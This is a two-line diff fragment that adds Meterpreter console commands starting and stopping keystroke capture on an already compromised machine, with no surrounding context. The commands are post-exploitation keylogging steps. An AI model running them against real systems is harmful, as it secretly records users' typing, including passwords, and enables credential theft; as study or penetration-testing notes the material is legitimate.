@@ -1,0 +1,2 @@
+meterpreter > keyscan_start
+meterpreter > keyscan_stop
